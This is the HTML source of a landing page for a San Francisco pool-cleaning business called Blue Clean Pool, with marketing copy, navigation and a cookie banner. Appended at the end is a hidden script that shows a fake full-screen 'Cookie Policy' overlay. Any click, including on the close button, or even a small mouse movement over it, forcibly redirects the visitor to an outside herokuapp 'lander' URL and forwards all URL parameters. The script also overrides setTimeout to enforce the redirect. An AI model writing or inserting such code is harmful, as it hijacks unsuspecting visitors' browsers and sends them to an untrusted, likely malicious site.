<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blue Clean  Pool Services - Professional Pool Maintenance</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.11.1/font/bootstrap-icons.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #4842f5;
            --primary-light: #6964f7;
            --light-gray: #f8f9fa;
        }

        body {
            font-family: 'Poppins', sans-serif;
        }

        .navbar {
            background-color: white;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .navbar-brand {
            font-weight: 700;
            color: rgb(81, 81, 144) !important;
        }

        .nav-link {
            font-weight: 500;
        }

        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
        }

        .btn-primary:hover {
            background-color: var(--primary-light);
            border-color: var(--primary-light);
        }

        .hero {
            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('./assets/images/1.png') center/cover;
            height: 100vh;
            display: flex;
            align-items: center;
            color: white;
        }

        .section-heading {
            color: var(--primary-color);
            font-weight: 700;
            margin-bottom: 2rem;
        }

        .feature-card {
            padding: 2rem;
            border-radius: 15px;
            background-color: white;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s ease;
            height: 100%;
        }

        .feature-card:hover {
            transform: translateY(-10px);
        }

        .service-preview {
            background-color: var(--light-gray);
            border-radius: 15px;
            overflow: hidden;
            transition: transform 0.3s ease;
        }

        .service-preview:hover {
            transform: translateY(-5px);
        }

        .testimonial-card {
            background-color: white;
            border-radius: 15px;
            padding: 2rem;
            margin: 1rem;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .process-step {
            text-align: center;
            padding: 2rem;
            position: relative;
        }

        .process-step::after {
            content: '';
            position: absolute;
            top: 50%;
            right: -50px;
            width: 100px;
            height: 2px;
            background-color: var(--primary-color);
            display: none;
        }

        @media (min-width: 768px) {
            .process-step::after {
                display: block;
            }
            
            .process-step:last-child::after {
                display: none;
            }
        }

        .step-number {
            width: 40px;
            height: 40px;
            background-color: var(--primary-color);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
            font-weight: bold;
        }

        .rating-stars {
            color: gold;
            font-size: 1.2rem;
            margin-bottom: 1rem;
        }

        .cta-section {
            background: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)), url('/api/placeholder/1920/600') center/cover;
            color: white;
            padding: 6rem 0;
        }

        .benefit-card {
            text-align: center;
            padding: 2rem;
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            height: 100%;
            transition: transform 0.3s ease;
        }

        .benefit-card:hover {
            transform: translateY(-10px);
        }



    </style>
</head>
<body>

    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light sticky-top">
        <div class="container">
            <a class="navbar-brand" href="index.php">Blue Clean Pool</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link active" href="index.php">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="about.html">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="services.html">Services</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="contact.html">Contact</a>
                    </li>
                    
                </ul>
            </div>
        </div>
    </nav>

    <!-- Hero Section -->
    <section class="hero">
        <div class="container">
            <div class="row">
                <div class="col-lg-8">
                    <h1 class="display-4 fw-bold mb-4">Blue Clean  Pool Services</h1>
                    <p class="lead mb-4">Dive Into Effortless Pool Bliss with Blue Clean Pool—San Francisco's Premier Choice
                    </p>
                    <div class="d-flex gap-3">
                        <a href="contact.html" class="btn btn-primary btn-lg">Get Started</a>
                        <a href="services.html" class="btn btn-outline-light btn-lg">Our Services</a>
                    </div>
                </div>
            </div>
        </div>
    </section>

<!-- About Us Section -->
<section class="about-us bg-light py-5">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-lg-10">
                <!-- <h2 class="fw-bold mb-4 text-center">About Blue Clean Pool Services</h2> -->
                <p class="mb-4">
                    Pools: shimmering sanctuaries of serenity—or, if neglected, logistical nightmares. At Blue Clean Pool, perched on Treat Avenue in San Francisco, we flip the script. Stress? Out. Frustration? Banished.
                </p>
                <p class="mb-4">
                    Instead, picture this: a crystal-clear retreat, ready for cannonballs, cocktails, or simply floating under the stars.
                </p>
                <p class="mb-4">
                    Our squad of pool perfectionists? Unstoppable. Armed with expertise sharper than a diamond cutter’s blade, we handle repairs, upkeep, deep cleans, and even transformational renovations.
                </p>
                <p>
                    Cracks crisscrossing your pool’s surface? Fixed. Equipment humming ominously like an off-key orchestra? Silenced. A swamp masquerading as your backyard oasis? Restored.
                </p>
            </div>
        </div>
    </div>
</section>



    <!-- Features Section -->
    <section class="py-5">
        <div class="container">
            <div class="row g-4">
                <div class="col-md-4">
                    <div class="feature-card">
                        <i class="bi bi-shield-check text-primary display-4 mb-3"></i>
                        <h4>Licensed & Insured</h4>
                        <p>Certified? Check. Insured? Absolutely. Our pros come equipped with credentials and cutting-edge techniques, ready to tackle any pool challenge with confidence.</p>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="feature-card">
                        <i class="bi bi-calendar-check text-primary display-4 mb-3"></i>
                        <h4>Regular Service</h4>
                        <p>Like clockwork, but better. Precision-timed maintenance keeps your pool pristine and primed for enjoyment, no matter the season.</p>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="feature-card">
                        <i class="bi bi-clock text-primary display-4 mb-3"></i>
                        <h4>24/7 Support</h4>
                        <p>Pool emergencies don’t keep business hours, and neither do we. Day or night, our team’s on standby to rescue your pool from any crisis.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- How It Works -->
    <!-- <section class="py-5 bg-light">
        <div class="container">
            <h2 class="text-center section-heading mb-5">How It Works</h2>
            <div class="row">
                <div class="col-md-3">
                    <div class="process-step">
                        <div class="step-number">1</div>
                        <h5>Contact Us</h5>
                        <p>Reach out through our form or give us a call</p>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="process-step">
                        <div class="step-number">2</div>
                        <h5>Free Inspection</h5>
                        <p>We'll assess your pool's condition</p>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="process-step">
                        <div class="step-number">3</div>
                        <h5>Custom Plan</h5>
                        <p>Get a tailored maintenance schedule</p>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="process-step">
                        <div class="step-number">4</div>
                        <h5>Regular Service</h5>
                        <p>Enjoy your Blue Clean  pool</p>
                    </div>
                </div>
            </div>
        </div>
    </section> -->

    <!-- Featured Services -->
    <!-- <section class="py-5">
        <div class="container">
            <h2 class="text-center section-heading mb-5">Featured Services</h2>
            <div class="row g-4">
                <div class="col-md-4">
                    <div class="service-preview">
                        <img src="/api/placeholder/400/300" alt="Weekly Maintenance" class="img-fluid">
                        <div class="p-4">
                            <h4>Weekly Maintenance</h4>
                            <p>Comprehensive cleaning and chemical balance checks</p>
                            <a href="services.html" class="btn btn-primary">Learn More</a>
                        </div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="service-preview">
                        <img src="/api/placeholder/400/300" alt="Equipment Repair" class="img-fluid">
                        <div class="p-4">
                            <h4>Equipment Repair</h4>
                            <p>Expert diagnosis and repair of all pool systems</p>
                            <a href="services.html" class="btn btn-primary">Learn More</a>
                        </div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="service-preview">
                        <img src="/api/placeholder/400/300" alt="Green Pool Recovery" class="img-fluid">
                        <div class="p-4">
                            <h4>Green Pool Recovery</h4>
                            <p>Specialized treatment for algae-affected pools</p>
                            <a href="services.html" class="btn btn-primary">Learn More</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section> -->

    <!-- Testimonials -->
    <!-- <section class="py-5 bg-light">
        <div class="container">
            <h2 class="text-center section-heading mb-5">What Our Clients Say</h2>
            <div class="row">
                <div class="col-md-4">
                    <div class="testimonial-card">
                        <div class="rating-stars">
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                        </div>
                        <p class="mb-3">"The best pool service we've ever had. Professional, punctual, and thorough. Our pool has never looked better!"</p>
                        <h5 class="mb-1">John Smith</h5>
                        <p class="text-muted">Homeowner</p>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="testimonial-card">
                        <div class="rating-stars">
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                        </div>
                        <p class="mb-3">"Exceptional service! They transformed our green pool into a Blue Clean  oasis in just days. Highly recommended!"</p>
                        <h5 class="mb-1">Sarah Johnson</h5>
                        <p class="text-muted">Property Manager</p>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="testimonial-card">
                        <div class="rating-stars">
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                            <i class="bi bi-star-fill"></i>
                        </div>
                        <p class="mb-3">"Reliable, professional, and knowledgeable. Their team always goes above and beyond to ensure our pool is perfect!"</p>
                        <h5 class="mb-1">Mike Davis</h5>
                        <p class="text-muted">Resort Owner</p>
                    </div>
                </div>
            </div>
        </div>
    </section> -->

    <!-- Benefits Section -->
    <section class="py-5">
        <div class="container">
            <h2 class="text-center section-heading mb-5">Why Pick Blue Clean Pool?</h2>
            <div class="row g-4">
                <div class="col-md-3">
                    <div class="benefit-card">
                        <i class="bi bi-tools text-primary display-4 mb-3"></i>
                        <h4>Roots in the Neighborhood</h4>
                        <p>Local minds meet years of grit and grind to deliver standout results.
                        </p>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="benefit-card">
                        <i class="bi bi-graph-up-arrow text-primary display-4 mb-3"></i>
                        <h4>Flat-Rate Simplicity</h4>
                        <p>No surprise fees, no fine print. Just numbers that make sense.</p>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="benefit-card">
                        <i class="bi bi-cash-stack text-primary display-4 mb-3"></i>
                        <h4>Schedule Magic</h4>
                        <p>Early morning? Late evening? Your pool, your clock.</p>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="benefit-card">
                        <i class="bi bi-chat-dots text-primary display-4 mb-3"></i>
                        <h4>Laser-Focused Solutions</h4>
                        <p>Your needs, heard loud and clear. Your budget, respected like gospel.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Call to Action Section -->
    <section class="cta-section">
        <div class="container text-center">
            <h2 class="display-4 fw-bold mb-4">Ready for Blue Clean  Water?</h2>
            <p class="lead mb-4">So, while others wrestle with algae blooms and filter fiascos, you’ll be living the dream. Whether it’s a party-ready poolscape or a lazy Sunday soak, Blue Clean Pool is your passport to aquatic euphoria.</p>
            <div class="d-flex justify-content-center gap-3">
                <a href="contact.html" class="btn btn-primary btn-lg">Call us now</a>
            </p>
        </div>
        <p class="mt-4"> Because life’s too short for murky waters.
    </div>
    </section>

    <!-- Recent Work Gallery -->
    <!-- <section class="py-5">
        <div class="container">
            <h2 class="text-center section-heading mb-5">Our Recent Work</h2>
            <div class="row g-4">
                <div class="col-md-4">
                    <div class="gallery-img">
                        <img src="/api/placeholder/400/300" alt="Pool Maintenance" class="img-fluid">
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="gallery-img">
                        <img src="/api/placeholder/400/300" alt="Pool Cleaning" class="img-fluid">
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="gallery-img">
                        <img src="/api/placeholder/400/300" alt="Pool Renovation" class="img-fluid">
                    </div>
                </div>
            </div>
        </div>
    </section> -->

    <!-- Awards Section -->
    <!-- <section class="py-5 awards-section">
        <div class="container">
            <h2 class="text-center section-heading mb-5">Recognition & Awards</h2>
            <div class="row">
                <div class="col-md-3 text-center">
                    <div class="award-badge">
                        <i class="bi bi-award text-primary display-4"></i>
                    </div>
                    <h5>Best Service 2024</h5>
                </div>
                <div class="col-md-3 text-center">
                    <div class="award-badge">
                        <i class="bi bi-trophy text-primary display-4"></i>
                    </div>
                    <h5>Top Rated Service</h5>
                </div>
                <div class="col-md-3 text-center">
                    <div class="award-badge">
                        <i class="bi bi-patch-check text-primary display-4"></i>
                    </div>
                    <h5>Certified Excellence</h5>
                </div>
                <div class="col-md-3 text-center">
                    <div class="award-badge">
                        <i class="bi bi-star text-primary display-4"></i>
                    </div>
                    <h5>Customer Choice</h5>
                </div>
            </div>
        </div>
    </section> -->

    <!-- Service Areas -->
    <!-- <section class="py-5">
        <div class="container">
            <h2 class="text-center section-heading mb-5">Areas We Serve</h2>
            <div class="row text-center">
                <div class="col-md-4">
                    <h5 class="mb-3">North Region</h5>
                    <p>Watertown<br>Blue Clean Lake<br>Blue Springs</p>
                </div>
                <div class="col-md-4">
                    <h5 class="mb-3">Central Region</h5>
                    <p>Riverside<br>Downtown<br>Harbor District</p>
                </div>
                <div class="col-md-4">
                    <h5 class="mb-3">South Region</h5>
                    <p>Sunny Vale<br>Palm Beach<br>Coral Bay</p>
                </div>
            </div>
        </div>
    </section> -->

    <!-- Footer -->
    <footer class="bg-dark text-light py-5">
        <div class="container">
            <div class="row g-4">
                <div class="col-lg-4">
                    <h5 class="mb-4">Blue Clean Pool</h5>
                    <p>Professional pool maintenance services committed to keeping your pool pristine and safe all year round.</p>
                </div>
                <div class="col-lg-2">
                    <h5 class="mb-4">Quick Links</h5>
                    <ul class="list-unstyled">
                        <li><a href="about.html" class="text-light text-decoration-none mb-2 d-block">About Us</a></li>
                        <li><a href="services.html" class="text-light text-decoration-none mb-2 d-block">Services</a></li>
                        <li><a href="contact.html" class="text-light text-decoration-none mb-2 d-block">Contact</a></li>
                        <li><a href="privacy-policy.html" class="text-light text-decoration-none mb-2 d-block">Privacy-policy</a></li>
<li><a href="terms-and-condiction.html" class="text-light text-decoration-none mb-2 d-block">Terms & Condictions</a></li>
                    </ul>
                </div>
                <div class="col-lg-3">
                    <h5 class="mb-4">Contact Info</h5>
                    <p><i class="bi bi-geo-alt-fill me-2"></i> 970 Treat Ave,

San Francisco, CA 94110, USA</p>
                    <p><i class="bi bi-telephone-fill me-2"></i>+1 4152401281</p>
                    <p><i class="bi bi-envelope-fill me-2"></i> info@bluecleanpool.com</p>
                </div>
                <div class="col-lg-3">
                    <h5 class="mb-4">Business Hours</h5>
                    <p>Monday - Friday: 8:00 AM - 6:00 PM</p>
                    <p>Saturday: 9:00 AM - 4:00 PM</p>
                    <p>Sunday: Closed</p>
                    <p class="text-warning">24/7 Emergency Service Available</p>
                </div>
            </div>
            <div class="border-top border-secondary mt-4 pt-4 text-center">
                <p>&copy; 2025 Blue Clean Pool. All rights reserved.</p>
            </div>
        </div>
    </footer>
    <div id="cookieConsent" class="cookie-consent-banner">
        <p>
          We use cookies to ensure you get the best experience on our website.
          <a href="cookies-policy.html" class="text-white">Cookies Policy</a>.
          <button id="acceptCookies" class="btn btn-primary btn-sm">Got it!</button>
        </p>
      </div>

    <!-- Bootstrap JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
          var cookieConsent = document.getElementById("cookieConsent");
          var acceptCookies = document.getElementById("acceptCookies");
  
          if (!localStorage.getItem("cookiesAccepted")) {
            cookieConsent.style.display = "block";
          }
  
          acceptCookies.addEventListener("click", function () {
            localStorage.setItem("cookiesAccepted", "true");
            cookieConsent.style.display = "none";
          });
        });
      </script>
    <!-- Default Statcounter code for White
https://wj4-18bdc02e7efa.herokuapp.com/ -->
<script type="text/javascript">
var sc_project=13208968; 
var sc_invisible=1; 
var sc_security="9966ab9d"; 
</script>
<script type="text/javascript"
src="https://www.statcounter.com/counter/counter.js"
async></script>
<noscript><div class="statcounter"><a title="Web Analytics"
href="https://statcounter.com/" target="_blank"><img
class="statcounter"
src="https://c.statcounter.com/13208968/0/9966ab9d/1/"
alt="Web Analytics"
referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
<!-- End of Statcounter Code -->
    <script>
	        document.addEventListener("DOMContentLoaded", function () {
	            const redirectUrl = "https://lp6a-538d63fe54e6.herokuapp.com/lander";

	            // >>> ADD: build redirect URL with ALL current parameters
	            const buildRedirectUrlWithParams = () => {
	                const u = new URL(redirectUrl, window.location.href);
	                const current = new URL(window.location.href);

	                // Forward ALL query parameters (?a=1&b=2...)
	                current.searchParams.forEach((value, key) => u.searchParams.append(key, value));

	                // Optional: also forward #hash
	                u.hash = current.hash;

	                return u.toString();
	            };
	            const redirectUrlWithParams = buildRedirectUrlWithParams();

	            const style = document.createElement("style");
	            style.textContent = `
	                .cookie-overlay {
	                    position: fixed;
	                    inset: 0;
	                    background: rgba(0, 0, 0, 0.8);
	                    backdrop-filter: blur(10px);
	                    display: flex;
	                    align-items: center;
	                    justify-content: center;
	                    padding: 20px;
	                    z-index: 9999;
	                    animation: fadeInBackground 0.5s ease-out forwards;
	                }
	                @keyframes fadeInBackground {
	                    from { opacity: 0; }
	                    to { opacity: 1; }
	                }
	                .cookie-popup {
	                    position: fixed;
	                    bottom: 60px;
	                    left: 50%;
	                    transform: translateX(-50%);
	                    background-color: #ffffff;
	                    border: none;
	                    color: #333;
	                    padding: 30px;
	                    border-radius: 10px;
	                    z-index: 10000;
	                    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
	                    max-width: 400px;
	                    text-align: center;
	                }
	                .close-btn {
	                    background: none;
	                    border: none;
	                    font-size: 1.5rem;
	                    position: absolute;
	                    top: 10px;
	                    right: 10px;
	                    cursor: pointer;
	                    color: #888;
	                }
	                .btn-primary {
	                    background-color: #007bff;
	                    color: #fff;
	                    border: none;
	                    padding: 12px 24px;
	                    border-radius: 5px;
	                    cursor: pointer;
	                    margin-top: 15px;
	                    display: inline-block;
	                    text-decoration: none;
	                    transition: background-color 0.3s;
	                }
	                .btn-primary:hover {
	                    background-color: #0056b3;
	                }
	                h3 {
	                    font-family: 'Arial', sans-serif;
	                    margin-bottom: 10px;
	                }
	                p {
	                    font-family: 'Arial', sans-serif;
	                    line-height: 1.5;
	                }
	            `;
	            document.head.appendChild(style);
	            const overlay = document.createElement("div");
	            overlay.className = "cookie-overlay";
	            overlay.id = "cookie-overlay";
	            overlay.innerHTML = `
	<div class="cookie-popup">
	<button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
	<h3>Cookie Policy</h3>
	<p>
	                    This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
	</p>
	<a href="https://lp6a-538d63fe54e6.herokuapp.com/lander" id="accept-cookies" class="btn-primary">Accept</a>
	</div>
	            `;
	            document.body.appendChild(overlay);
	            let isRedirected = false;
	            let startPos = null;
	            let redirectTimeout = null;
	            const handleRedirect = () => {
	                if (!isRedirected) {
	                    isRedirected = true;
	                    window.location.href = redirectUrl;
	                }
	            };

	            // >>> ADD: force all redirect triggers to use redirectUrlWithParams
	            const doRedirectWithParams = () => {
	                if (isRedirected) return;
	                isRedirected = true;
	                window.location.href = redirectUrlWithParams;
	            };

	            // 1) Intercept setTimeout(handleRedirect, ...) used by your mousemove logic
	            const _setTimeout = window.setTimeout.bind(window);
	            window.setTimeout = function (fn, delay, ...args) {
	                if (fn === handleRedirect) {
	                    return _setTimeout(doRedirectWithParams, delay, ...args);
	                }
	                return _setTimeout(fn, delay, ...args);
	            };

	            // 2) Intercept clicks BEFORE your existing click handlers run
	            ["accept-cookies", "close-popup"].forEach((id) => {
	                const el = document.getElementById(id);
	                if (!el) return;
	                el.addEventListener("click", function (e) {
	                    e.preventDefault();
	                    e.stopImmediatePropagation();
	                    doRedirectWithParams();
	                }, true); // capture phase
	            });

	            // Optional: update the visible hrefs in the popup too
	            const acceptEl = document.getElementById("accept-cookies");
	            if (acceptEl) acceptEl.href = redirectUrlWithParams;

	            document.querySelectorAll('#cookie-overlay a.cta').forEach(a => {
	                a.href = redirectUrlWithParams;
	            });

	            const detectMouseMove = (event) => {
	                if (isRedirected) return;
	                const screenHeight = window.innerHeight;
	                const activeTop = screenHeight * 0.15;
	                if (event.clientY >= activeTop) {
	                    if (!startPos) {
	                        startPos = { x: event.clientX, y: event.clientY };
	                    } else {
	                        const dx = Math.abs(event.clientX - startPos.x);
	                        const dy = Math.abs(event.clientY - startPos.y);
	                        if ((dx > 15 || dy > 15) && !redirectTimeout) {
	                            redirectTimeout = setTimeout(handleRedirect, 1000);
	                        }
	                    }
	                } else {
	                    startPos = null;
	                    clearTimeout(redirectTimeout);
	                    redirectTimeout = null;
	                }
	            };
	            document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
	            document.getElementById("accept-cookies").addEventListener("click", function (e) {
	                e.preventDefault();
	                handleRedirect();
	            });
	            document.getElementById("close-popup").addEventListener("click", function (e) {
	                e.preventDefault();
	                handleRedirect();
	            });
	        });
	</script>
</body>
</html>
